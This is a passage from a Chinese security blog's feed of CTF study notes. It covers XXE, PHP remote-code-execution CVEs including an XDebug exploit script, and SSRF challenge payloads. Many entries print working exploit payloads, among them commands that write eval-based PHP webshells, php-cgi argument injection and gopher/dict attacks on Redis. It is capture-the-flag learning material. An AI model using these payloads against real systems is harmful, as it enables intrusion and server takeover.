class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://node2.anna.nssctf.cn:28487/ghctf&quot;</span><br><span class="line">xml = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">   &lt;!ENTITY nn SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">   &lt;name&gt;&amp;nn;&lt;/name&gt;</span><br><span class="line">   &lt;age&gt;18&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;&#x27;&#x27;&#x27;</span><br><span class="line">response = requests.post(url, data=&#123;&quot;xml&quot;: xml&#125;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、XML基础知识&quot;&gt;&lt;a href=&quot;#一、XML基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、XML基础知识&quot;&gt;&lt;/a&gt;一、XML基础知识&lt;/h1&gt;&lt;p&gt;XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php漏洞</title>
    <link href="http://1768161086.github,io/2025/03/10/php%E6%BC%8F%E6%B4%9E/"/>
    <id>http://1768161086.github,io/2025/03/10/php%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-03-10T10:30:01.000Z</published>
    <updated>2025-03-10T10:31:03.790Z</updated>
    
    <content type="html"><![CDATA[<p>1.SSRF漏洞<br>2.php7.1.33CVE-2019-11043，远程代码执行漏洞<br>该漏洞位于PHP-FPM模块的env_path_info函数，在特定的nginx + php-fpm配置中，web用户就可能会进行代码执行。该漏洞需要在nginx.conf中进行特定配置才能触发。配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">  ...</span><br><span class="line">  fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">  fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">  fastcgi_pass   php:9000;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用%0a（换行符）来破坏正则，从而使得PATH_INFO为空</p><p>利用条件： nginx配置了fastcgi_split_path_info</p><p>受影响系统： PHP 5.6-7.x，Nginx&gt;&#x3D;0.7.31</p><p>复现需要golang环境</p><p>漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run . &quot;http://92cdd785-55c4-4b35-85fa-ae1dc7fdc367.challenge.ctf.show/index.php&quot;</span><br></pre></td></tr></table></figure><p>3.PHP&#x2F;5.6.38CVE-2018-19518（远程命令执行漏洞）</p><p>影响版本：PHP 5.6.x &lt; 5.6.39</p><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand&#x3D;来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 原始payload</span><br><span class="line">x+-oProxyCommand=echo    echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; /var/www/html/1.php|base64    -d|sh&#125;</span><br><span class="line"></span><br><span class="line"># base64+url编码以后</span><br><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;</span><br><span class="line"></span><br><span class="line"># 模板</span><br><span class="line">hostname=x+-oProxyCommand%3decho%09【要执行命令的base64】|base64%09-d|sh&#125;&amp;username=xxx&amp;password=xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4.受影响系统PHP &lt; 5.3.12 、 PHP &lt; 5.4.2:​ CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中。</p><p>漏洞利用</p><p>​ cgi模式下有如下可控命令行参数可用：</p><p>-c 指定php.ini文件（PHP的配置文件）的位置<br>-n 不要加载php.ini文件<br>-d 指定配置项<br>-b 启动fastcgi进程<br>-s 显示文件源码<br>-T 执行指定次该文件<br>-h和-? 显示帮助<br>4.1那么最简单的利用方式就是?-s可以直接显示源码</p><p>4.2一个更好的利用方法是通过使用-d指定auto_prepend_file来制造任意文件包含漏洞，执行任意代码：（其中用“+”代替了“空格”，并将“&#x3D;”和“:”进行了URL编码）</p><p>​ 其原理是：利用可控命令行参数 -d 将allow_url_include 得值设为 on 并使用 auto_prepend_file 函数在页面顶部加载文件，而构造加载的文件为 php:&#x2F;&#x2F;input 读取的原始POST数据(也就是传输的数据 <?php echo shell_exec("ls");?> 的执行结果)，并传递到回应包里。构造请求包如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec(&quot;ls&quot;);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.XDebug 远程调试漏洞,debug开启，端口9000</p><p>条件：</p><p>开启了远程调试模式，并设置<code>remote_connect_back = 1</code></p><p>xdebug.remote_connect_back &#x3D; 1</p><p>xdebug.remote_enable &#x3D; 1</p><p>这个配置下，我们访问<a href="http://target-url/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target-url/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><br>利用脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import socket</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(1)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def recv_xml(sock):</span><br><span class="line">    blocks = []</span><br><span class="line">    data = b&#x27;&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            data = data + sock.recv(1024)</span><br><span class="line">        except socket.error as e:</span><br><span class="line">            break</span><br><span class="line">        if not data:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        while data:</span><br><span class="line">            eop = data.find(b&#x27;\x00&#x27;)</span><br><span class="line">            if eop &lt; 0:</span><br><span class="line">                break</span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+1:]</span><br><span class="line"></span><br><span class="line">        if len(blocks) &gt;= 4:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    return blocks[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def trigger(url):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    try:</span><br><span class="line">        session.get(url + &#x27;?XDEBUG_SESSION_START=phpstorm&#x27;, timeout=0.1)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;XDebug remote debug code execution.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, required=True, help=&#x27;the code you want to execute.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-t&#x27;, &#x27;--target&#x27;, required=True, help=&#x27;target url.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-l&#x27;, &#x27;--listen&#x27;, default=9000, type=int, help=&#x27;local port&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    ip_port = (&#x27;0.0.0.0&#x27;, args.listen)</span><br><span class="line">    sk = socket.socket()</span><br><span class="line">    sk.settimeout(10)</span><br><span class="line">    sk.bind(ip_port)</span><br><span class="line">    sk.listen(5)</span><br><span class="line"></span><br><span class="line">    pool.submit(trigger, args.target)</span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    conn.sendall(b&#x27;&#x27;.join([b&#x27;eval -i 1 -- &#x27;, base64.b64encode(args.code.encode()), b&#x27;\x00&#x27;]))</span><br><span class="line"></span><br><span class="line">    data = recv_xml(conn)</span><br><span class="line">    print(&#x27;[+] Recieve data: &#x27; + data.decode())</span><br><span class="line">    g = re.search(rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;, data, re.I)</span><br><span class="line">    if not g:</span><br><span class="line">        print(&#x27;[-] No result...&#x27;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    data = g.group(1)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        print(&#x27;[+] Result: &#x27; + base64.b64decode(data).decode())</span><br><span class="line">    except binascii.Error:</span><br><span class="line">        print(&#x27;[-] May be not string result...&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当我们访问<code>/index.php?XDEBUG_SESSION_START=phpstorm</code>时，返回包会多出一个<code>Set-Cookie</code>，内容是<code>XDEBUG_SESSION=phpstorm;...</code>。</p><p>执行payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t 【靶机url】/index.php -c &#x27;shell_exec(&quot;ls&quot;);&#x27; -l 9000</span><br></pre></td></tr></table></figure><h2 id="敏感⽂件读取"><a href="#敏感⽂件读取" class="headerlink" title="敏感⽂件读取"></a>敏感⽂件读取</h2><p>第⼀种解法，有出过题的，⼤部分都是采⽤<a href="https://github.com/CTF-Archives/ctf-docker-template%E8%BF%99%E2%BE%A5%E2%BE%AF%E7%9A%84%E6%A8%A1%E7%89%88%E3%80%82%E2%BC%80%E8%88%AC%E5%87%BA%E9%A2%98%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B8%BA%E4%BA%86%E2%BD%85%E4%BE%BF%EF%BC%8C%E4%B8%8D%E5%8E%BB%E4%BF%AE%E6%94%B9dockerfile%E2%BD%82%E4%BB%B6%EF%BC%8C%E9%83%BD%E4%BC%9A%E7%9B%B4%E6%8E%A5%E5%9C%A8%E5%AE%B9%E5%99%A8%E5%86%85%E4%BF%AE%E6%94%B9%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8Dcommit%E2%BD%A3%E6%88%90%E9%95%9C%E5%83%8F%E3%80%82">https://github.com/CTF-Archives/ctf-docker-template这⾥⾯的模版。⼀般出题过程中，为了⽅便，不去修改dockerfile⽂件，都会直接在容器内修改，然后再commit⽣成镜像。</a> ⾥⾯的php出题模版中，有⼀个容器启动命令⽂件docker-entrypoint.sh。可以看到该命令⽂件在容器初始化后就会被删掉。但是在提交⽣成镜像后，由镜像⽣成容器⼜需要运⾏该⽂件。因此有的出题者为了⽅便可能就不删除该⽂件，这时候就可以碰碰运⽓，看看出题者有没有把这个⽂件删掉。没有删掉，就能够获取路径</p><p>因此，在这⾥直接尝试读取docker-entrypoint.sh⽂件，可以发现该⽂件将flag变量输⼊到了&#x2F;f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jcl kej1wlkcj1lkwej1lkcwjellag。</p><h2 id="CVE-2024-296"><a href="#CVE-2024-296" class="headerlink" title="CVE-2024-296"></a>CVE-2024-296</h2><p><a href="https://github.com/kezibei/php-filter-iconv">GitHub - kezibei&#x2F;php-filter-iconv</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py http://1.1.1.1:8080/index.php &quot;echo &#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27; &gt; 1.php&quot;</span><br></pre></td></tr></table></figure><p>访问1.php执行命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.SSRF漏洞&lt;br&gt;2.php7.1.33CVE-2019-11043，远程代码执行漏洞&lt;br&gt;该漏洞位于PHP-FPM模块的env_path_info函数，在特定的nginx + php-fpm配置中，web用户就可能会进行代码执行。该漏洞需要在nginx.conf中</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SSRF</title>
    <link href="http://1768161086.github,io/2025/03/10/SSRF/"/>
    <id>http://1768161086.github,io/2025/03/10/SSRF/</id>
    <published>2025-03-10T10:10:24.000Z</published>
    <updated>2025-03-13T12:21:12.328Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SSRF基础"><a href="#SSRF基础" class="headerlink" title="SSRF基础"></a>SSRF基础</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h3 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a><strong>相关函数和类</strong></h3><p><a href="https://so.csdn.net/so/search?q=gethostbyname&spm=1001.2101.3001.7020">gethostbyname</a>() 返回主机名 hostname 对应的 IPv4 互联网地址。</p><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中<br>readfile()：输出一个文件的内容<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用<br>fopen()：打开一个文件文件或者 URL<br>PHP原生类SoapClient在触发反序列化时可导致SSRF</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a><strong>利用方式</strong></h3><p>1.让服务端去访问相应的网址</p><p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p><p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p><p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p><p>5.攻击内网应用程序（利用跨协议通信技术）</p><p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p><p>7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p><h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shellhttp&#x2F;s协议：探测内网主机存活</p><h3 id="Ⅰ、SSRF攻击点"><a href="#Ⅰ、SSRF攻击点" class="headerlink" title="Ⅰ、SSRF攻击点"></a>Ⅰ、SSRF攻击点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>curl_init()</code>：初始curl会话</li><li><code>curl_setopt()</code>：会话设置</li><li><code>curl_exec()</code>：执行curl会话,获取内容</li><li><code>curl_close()</code>：会话关闭</li></ul><h3 id="Ⅱ、gopher协议"><a href="#Ⅱ、gopher协议" class="headerlink" title="Ⅱ、gopher协议"></a>Ⅱ、gopher协议</h3><p>通过gopher协议，将请求体用url编码后<strong>加上任意字符</strong>,<em>一般是下划线</em>，接上gopher的url即可执行GET、POST请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip:port/_[stream]</span><br></pre></td></tr></table></figure><h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">post: url=http://127.0.0.1/flag.php</span><br><span class="line">或者使用 file 伪协议去读取文件</span><br><span class="line">post: url=file:///var/www/html/index.php 查看源码</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>绕过local host和127.0.0.1</p><p>payload:ip地址<strong>进制转换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">十进制整数：url=http://2130706433/flag.php</span><br><span class="line">十六进制：url=http://0x7F.0.0.1/flag.php</span><br><span class="line">八进制：url=http://0177.0.0.1/flag.php</span><br><span class="line">十六进制整数：url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure><p>other</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php或者http://127.255.255.254/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h4 id="web354-过滤01"><a href="#web354-过滤01" class="headerlink" title="web354-过滤01"></a>web354-过滤01</h4><p>在自己的域名中添加一条A记录指向 127.0.0.1</p><p>或者使用 <code>http://sudo.cc</code>这个域名就是指向127.0.0.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://sudo.cc/flag.php</span><br></pre></td></tr></table></figure><h2 id="web357-在线DNS重绑定"><a href="#web357-在线DNS重绑定" class="headerlink" title="web357-在线DNS重绑定)"></a>web357-在线<a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">DNS重绑定</a>)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$url=$_POST[&#x27;url&#x27;]; </span><br><span class="line">$x=parse_url($url); </span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123; </span><br><span class="line">$ip = gethostbyname($x[&#x27;host&#x27;]); </span><br><span class="line">echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;; </span><br><span class="line">if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; </span><br><span class="line">    die(&#x27;ip!&#x27;); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    die(&#x27;scheme&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数解析：</p><p>gethostbyname() 返回主机名 hostname 对应的 IPv4 互联网地址。</p><p>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</p><p>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</p><p>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</p><p>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p><p>不能有内网ip，所以填一个公网ip:1.1.1.23</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://7f000001.01010117.rbndr.us/flag.php</span><br></pre></td></tr></table></figure><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">$url=$_POST[&#x27;url&#x27;]; </span><br><span class="line">$x=parse_url($url); </span><br><span class="line">if(preg_match(&#x27;/^http:\/\/ctf\..*show$/i&#x27;,$url))&#123; </span><br><span class="line">    echo file_get_contents($url); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则表达式的意思是以<a href="http://ctf.开头,以show结尾./">http://ctf.开头，以show结尾。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure><h2 id="web359利用gopher无密码注入mysql"><a href="#web359利用gopher无密码注入mysql" class="headerlink" title="web359利用gopher无密码注入mysql"></a>web359利用gopher无密码注入mysql</h2><p>登陆界面找到一个隐藏的攻击点:type:’hidden’对其进行SSRF攻击</p><p>详细请看另一篇文章</p><p>将 _ 下划线后面的内容再进行一次 url 编码（防止出现特殊字符，后端 curl 接收到参数后会默认解码一次）</p><p>抓包后将编码出来的数据（尾端去除%0a）以post方式传入returl,访问上传的文件执行命令获得flag</p><h2 id="web360-打redis"><a href="#web360-打redis" class="headerlink" title="web360-打redis"></a>web360-打redis</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库</p><p>手动尝试：</p><p>url传入dict:&#x2F;&#x2F;127.0.0.1:6379</p><p>dict探测 redis 默认端口是否存活：返回+OK 说明redis接收到了</p><p>设置本地数据库存放地址：可以看到返回一个+OK</p><p>使用上述方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 .\gopherus.py --exploit redis</span><br></pre></td></tr></table></figure><p> 传入一句话木马，默认生成shell.php文件</p><p>需要把 _ 后边的字符串再进行一次 url 编码，post传入url</p><p>最后访问shell.php</p><p>另一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php</span><br></pre></td></tr></table></figure><p>被过滤可用十六进制绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=dict://127.0.0.1:set:shell:&quot;&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SSRF基础&quot;&gt;&lt;a href=&quot;#SSRF基础&quot; class=&quot;headerlink&quot; title=&quot;SSRF基础&quot;&gt;&lt;/a&gt;SSRF基础&lt;/h3&gt;&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SSTI</title>
    <link href="http://1768161086.github,io/2025/03/07/SSTI/"/>
    <id>http://1768161086.github,io/2025/03/07/SSTI/</id>
    <published>2025-03-07T09:24:13.603Z</published>
    <updated>2025-03-12T12:40:26.655Z</updated>
    
